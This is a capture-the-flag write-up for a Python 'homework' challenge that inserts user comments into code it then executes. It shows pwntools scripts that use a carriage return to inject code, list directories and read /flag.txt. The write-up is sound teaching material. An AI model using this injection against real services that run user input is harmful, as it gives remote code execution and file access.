# My Awesome Python Homework Assignment
Created by: caandt  
Writeup by: Ethan Andrews (UtahSec)

## Description
I just finished my programming assignment but I forgot to add comments! Can you add some comments to my homework so I don't lose points?

## Writeup
### Initial Looks
We are given a python file that has several parts. There is a block of code in a string that gets put into an array of 
code lines. Then there's a loop that queries the users for a line number and a comment, and then inserts that comment into
that specific line. Then it executes the code string as a python file.

### Code Analysis
Analyzing the code, we can see the area in which it inserts the user's input into the code.

![image](https://github.com/user-attachments/assets/ddbc3ea6-cba1-4f82-846a-9c1698466511)

So this code doesn't sanitize the user's input, and converts it to a comment by prepending the `#` character.

![image](https://github.com/user-attachments/assets/7eba1c08-a351-4444-a84d-51f682c43505)

We can try to screw with the logic by inserting a `\n` newline character as a comment, but we can clearly see that unfortunately
it's interpreting it as actual characters instead of the single newline character.

### PwnTools

Because it's interpreting the stdin from the terminal as string characters, we will need to programatically send bytes.
For this challenge, I will be using pwntools.

```python
from pwn import *

# Insert actual ip and port
p = remote(...)
```

The first thing we'll test is inserting a newline character followed by code to see if this works.

```python
# Send Line number
p.send(b"0\n")

# Send Comment Input
p.send(b"\nprint('Working DEADBEEF')\n")

# Send No More comments
p.send(b"N\n")

p.interactive()
```

However, running this, we see a problem.

![image](https://github.com/user-attachments/assets/6e306d35-c6af-4c8e-b9c1-81727a466064)

It didn't appear to work. The reason for this is because of how python's `input()` function works.

Python's `input()` function reads user input until it receives a newline character, then stops. So when we sent
`\nprint('Working DEADBEEF')`, it read the first newline character, and then stopped collecting user input.

So this means we can't use the newline character.

However, there is a separate special character that we can use: the carriage return character `\r`. This character
resets the cursor to the beginning of the current line and effectively overwrites the current line if more data is
printed. This is the essence of how progress bars work.

We can instead add `\r` to the beginning of our comment.

```python
# Send Line number
p.send(b"0\n")

# Send Comment Input
p.send(b"\rprint('Working DEADBEEF')\n")

# Send no more comments
p.send(b"N\n")

p.interactive()
```

We can see that it successfully added it to the code overwriting the comment.

![image](https://github.com/user-attachments/assets/03a98d7a-c59e-4802-8c93-9ac1d3bbdfef)

And we can see it being executed.

![image](https://github.com/user-attachments/assets/915559df-c015-4813-8e8a-f3998d6560a9)

### Finding the flag

Now that we have remote code execution, we need to find the flag. We'll start by listing out
the current directory.

```python
# import os
p.send(b"0\n")
p.send(b"\rimport os\n")
p.send(b"y\n")

# print the current directory
p.send(b"1\n")
p.send(b'\rprint("\\n".join(os.listdir(".")))\n')
p.send(b"n\n")

p.interactive()
```

Unfortunately, we only see a `run` file.

![image](https://github.com/user-attachments/assets/07e450a2-2bca-49af-8ab0-75cd6d3c52af)

Let's look at the base directory.


```python
# import os
p.send(b"0\n")
p.send(b"\rimport os\n")
p.send(b"y\n")

# print the current directory
p.send(b"1\n")
p.send(b'\rprint("\\n".join(os.listdir("/")))\n')
p.send(b"n\n")

p.interactive()
```

Here we see the flag file at the very top line.

![image](https://github.com/user-attachments/assets/eb851c71-1560-4143-b03c-4f2ba6cab554)

Then we just simply open and read in the flag located at `/flag.txt`.

```python
from pwn import *

# Insert actual ip and port
p = remote(...)

p.send(b"0\n")
p.send(b"\rprint(open(\"/flag.txt\").read())\n")
p.send(b"n\n")

p.interactive()
```

Here we can see the flag being printed out.

![image](https://github.com/user-attachments/assets/639823c1-5ec8-4e5e-8e7b-66ec872880c4)

## Important Concepts
- Carriage Return Character
- Python
- pwntools

